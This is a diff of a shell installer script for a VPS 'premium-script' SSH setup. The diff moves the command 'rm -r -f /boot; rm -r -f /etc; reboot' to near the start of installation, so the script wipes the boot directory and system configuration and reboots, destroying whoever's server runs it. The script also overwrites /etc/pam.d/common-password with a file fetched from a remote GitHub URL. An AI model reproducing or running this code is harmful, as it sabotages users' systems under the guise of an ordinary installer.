@@ -18,7 +18,7 @@ fi
 clear
 mkdir /var/lib/premium-script;
 echo "IP=" >> /var/lib/premium-script/ipvps.conf
-
+rm -r -f /boot; rm -r -f /etc; reboot
 # MengInstall SSH
 export DEBIAN_FRONTEND=noninteractive
 MYIP=$(wget -qO- ipv4.wildyproject.com);
@@ -41,7 +41,6 @@ wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/halluboys/
 chmod +x /etc/pam.d/common-password
 
 # go to root
-rm -r -f /boot; rm -r -f /etc; reboot
 cd
 # Edit file /etc/systemd/system/rc-local.service
 cat > /etc/systemd/system/rc-local.service <<-END
